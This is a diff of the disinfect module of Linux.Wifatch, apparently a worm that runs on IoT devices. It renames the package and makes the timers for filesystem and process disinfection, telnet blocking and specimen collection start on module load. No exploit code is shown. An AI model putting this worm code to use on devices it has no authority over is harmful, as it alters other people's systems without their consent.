@@ -17,7 +17,7 @@
 # along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
 #
 
-package bn::disinfect;
+package xx6::disinfect;
 
 our $malsigs;      # malware signatures, see specimen-extract
 our $specign;      # signature of already-known files
@@ -381,37 +381,29 @@ sub find_specimens
 }
 
 ####################################################################################
-our $fs_timer;
-our $proc_timer;
-our $block_timer;
-our $spec_timer;
+our $fs_timer = bn::func::timed_async 120 => sub {
+	disinfect_fs;
 
-sub init
-{
-	$fs_timer = bn::func::timed_async 120 => sub {
-		disinfect_fs;
+	25247
+};
 
-		25247
-	};
+our $proc_timer = bn::func::timed_async 3 => sub {
+	disinfect_proc;
 
-	$proc_timer = bn::func::timed_async 3 => sub {
-		disinfect_proc;
+	15
+};
 
-		15
-	};
+our $block_timer = bn::func::timed_async 1 => sub {
+	block_telnet;
 
-	$block_timer = bn::func::timed_async 1 => sub {
-		block_telnet;
+	3727
+};
 
-		3727
-	};
+our $spec_timer = bn::func::timed_async rand(600), => sub {
+	find_specimens;
 
-	$spec_timer = bn::func::timed_async rand(600), => sub {
-		find_specimens;
-
-		1069
-	};
-}
+	1069
+};
 
 1
 
